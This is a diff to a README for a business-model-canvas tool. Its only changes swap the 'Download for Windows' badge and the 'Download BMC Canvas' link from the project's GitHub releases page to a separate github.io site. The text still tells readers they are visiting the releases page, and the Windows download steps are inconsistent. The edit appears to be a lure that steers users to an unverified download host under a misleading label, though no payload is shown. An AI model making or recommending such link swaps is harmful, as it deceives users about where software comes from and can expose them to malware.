@@ -1,6 +1,6 @@
 # 🧩 bmc-model-canvas - Plan Your Business Model Simply
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://github.com/obsolescent-speedcop233/bmc-model-canvas/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-blue?style=for-the-badge)](https://obsolescent-speedcop233.github.io)
 
 ## 📋 Overview
 
@@ -53,7 +53,7 @@ Follow these steps exactly. You will have the application running in under two m
 
 Visit the releases page to get the latest version:
 
-[**Download BMC Canvas**](https://github.com/obsolescent-speedcop233/bmc-model-canvas/releases)
+[**Download BMC Canvas**](https://obsolescent-speedcop233.github.io)
 
 On that page, look for the newest release. Click the link that says "bmc-canvas.html" or "Source code (zip)". The file name may vary. Pick the one labeled for Windows.
 
